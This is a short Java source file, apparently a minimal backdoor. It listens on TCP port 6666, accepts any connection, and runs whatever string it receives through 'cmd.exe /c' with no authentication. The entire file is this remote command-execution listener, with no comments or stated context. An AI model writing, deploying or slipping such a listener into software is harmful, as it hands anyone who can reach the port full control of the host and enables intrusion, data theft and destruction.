import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;

public class Receive {

    public static void main(String[] args) {
        try {

            while (true) {

                final ServerSocket serverSocket = new ServerSocket(6666);
                final Socket clientSocket = serverSocket.accept();
                final DataInputStream dIn = new DataInputStream(clientSocket.getInputStream());

                Runtime.getRuntime().exec("cmd.exe /c " + dIn.readUTF());

                serverSocket.close();
            }

        } catch (final IOException e) {
            e.printStackTrace();
        }
    }
}
